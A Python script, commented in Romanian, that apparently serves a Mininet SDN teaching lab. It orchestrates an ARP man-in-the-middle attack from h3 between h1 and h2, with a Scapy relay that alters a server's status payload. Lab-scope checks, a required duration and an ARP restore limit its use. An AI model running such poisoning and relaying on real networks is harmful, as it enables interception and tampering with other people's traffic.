#!/usr/bin/env python3
"""
arp_mitm.py - Orchestratorul atacului ARP MITM (ruleaza pe h3).

Flux:
    1. porti de siguranta (validate_lab_scope): iface, IP local, tinte, durata;
    2. ip_forward = 0 in h3 (Scapy e singurul care releaza);
    3. descoperirea o singura data a MAC-urilor reale h1/h2 si comparatia cu
       lab.yaml (daca difera, atacul NU porneste);
    4. pornirea RELAY-ului INAINTE de poisoning;
    5. pornirea otravirii periodice;
    6. asteptare pana la stop (Ctrl+C) sau expirarea duratei maxime;
    7. cleanup in finally: oprire, ARP corectiv, raport.

Rulare (in namespace-ul h3):
    mininet> h3 python3 attacks/arp_mitm.py --duration 30
"""
from __future__ import annotations

import argparse
import os
import signal
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lab_config import load_lab

from scapy.all import ARP, Ether, srp, conf  # noqa: E402
from attacks.arp_poisoner import ArpPoisoner  # noqa: E402
from attacks.scapy_relay import ScapyRelay  # noqa: E402

ALLOWED_LAB_IPS = {"10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"}
_stop = threading.Event()


def _sigint(signum, frame):
    _stop.set()


def get_local_ips():
    try:
        out = subprocess.check_output(["ip", "-4", "-o", "addr"], text=True)
        return {line.split()[3].split("/")[0] for line in out.splitlines()}
    except Exception:
        return set()


def validate_lab_scope(iface, h3_ip, targets):
    if os.geteuid() != 0:
        sys.exit("[EROARE] Ruleaza ca root (Scapy are nevoie de socket raw).")
    if h3_ip not in get_local_ips():
        sys.exit(f"[EROARE] IP-ul h3 {h3_ip} nu este local. Ruleaza in "
                 f"namespace-ul h3 (mininet> h3 python3 ...).")
    for t in targets:
        if t not in ALLOWED_LAB_IPS:
            sys.exit(f"[EROARE] Tinta {t} nu apartine laboratorului.")


def set_ip_forward_off():
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                       check=True, stdout=subprocess.DEVNULL)
        print("[ok] ip_forward=0 in h3 (relay-ul Scapy este singurul forwarder).")
    except Exception as e:
        print(f"[avertisment] Nu am putut seta ip_forward=0: {e}")


def resolve_once(ip, iface):
    """Descopera MAC-ul unui IP printr-o cerere ARP, o singura data."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 iface=iface, timeout=2, retry=2, verbose=False)
    for _, rcv in ans:
        return rcv[ARP].hwsrc.lower()
    return None


def main():
    lab = load_lab()
    h1, h2, h3 = lab.host("h1"), lab.host("h2"), lab.host("h3")
    ap = argparse.ArgumentParser(description="ARP MITM (laborator SDN)")
    ap.add_argument("--iface", default="h3-eth0")
    ap.add_argument("--period", type=float, default=2.0, help="perioada poisoning (s)")
    ap.add_argument("--duration", type=float, required=True,
                    help="durata maxima in secunde (OBLIGATORIU)")
    ap.add_argument("--skip-verify", action="store_true",
                    help="sari peste verificarea MAC-urilor (nerecomandat)")
    args = ap.parse_args()

    validate_lab_scope(args.iface, h3.ip, [h1.ip, h2.ip])
    signal.signal(signal.SIGINT, _sigint)
    conf.verb = 0
    conf.iface = args.iface

    set_ip_forward_off()

    # descoperirea si verificarea starii legitime
    if not args.skip_verify:
        print("[info] descopar MAC-urile reale ale h1 si h2 (inainte de poisoning)...")
        mac_h1 = resolve_once(h1.ip, args.iface)
        mac_h2 = resolve_once(h2.ip, args.iface)
        print(f"       h1={mac_h1}  (config {h1.mac})")
        print(f"       h2={mac_h2}  (config {h2.mac})")
        if mac_h1 != h1.mac or mac_h2 != h2.mac:
            sys.exit("[EROARE] MAC-urile descoperite nu se potrivesc cu lab.yaml. "
                     "Atacul nu porneste (posibil stare deja alterata).")
        print("[ok] MAC-uri confirmate.\n")

    relay = ScapyRelay(
        args.iface, h1.ip, h1.mac, h2.ip, h2.mac, h3.mac,
        server_port=int(lab.arp.get("server_port", 9000)),
        original=lab.arp.get("original_payload", "STATUS=OK\n").encode(),
        modified=lab.arp.get("modified_payload", "STATUS=NO\n").encode())
    poisoner = ArpPoisoner(args.iface, h1.ip, h1.mac, h2.ip, h2.mac, h3.mac,
                           period_s=args.period)

    print(f"[atac] MITM {h3.ip} intre {h1.ip} si {h2.ip} | durata max {args.duration:.0f}s")
    print("[atac] Ctrl+C pentru oprire controlata.\n")

    # 1) relay INAINTE de poisoning
    relay.start(_stop)
    time.sleep(0.5)
    # 2) poisoning periodic
    poisoner.start(_stop)

    t0 = time.monotonic()
    try:
        while not _stop.is_set() and (time.monotonic() - t0) < args.duration:
            time.sleep(0.2)
    finally:
        _stop.set()
        time.sleep(args.period + 0.3)
        poisoner.restore()
        print(f"\n[atac] Oprit. Statistici relay: {relay.stats}")
        print("[info] Verifica/curata cache-urile pe h1 si h2 cu `ip neigh flush all` "
              "(sau lasa runner-ul sa faca cleanup).")


if __name__ == "__main__":
    main()